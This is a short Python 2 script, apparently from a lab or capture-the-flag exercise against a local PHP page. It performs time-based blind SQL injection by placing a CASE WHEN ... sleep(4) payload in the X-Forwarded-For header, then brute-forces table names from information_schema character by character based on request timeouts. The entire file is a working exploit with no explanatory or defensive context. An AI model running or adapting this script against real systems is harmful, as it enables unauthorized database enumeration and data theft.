# -*- coding: utf-8 -*-  
import requests
import string
url="http://127.0.0.1:801/INSET_INTO.php"
allString="_"+","+" "+string.lowercase + string.uppercase + string.digits
result=""

for i in range(1,40):
    for str1 in allString:
        data="11'+(select case when (substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema!='information_schema' group by table_schema) from {0} for 1 )='{1}' ) then sleep(4) else 1 end ) and '1'='1".format(str(i),str1)
        print data
        headers={"x-forwarded-for":data}
        try:
            res=requests.get(url,headers=headers,timeout=3)
        except requests.exceptions.ReadTimeout, e:
            result += str1
            print result
            break
print 'result:' + result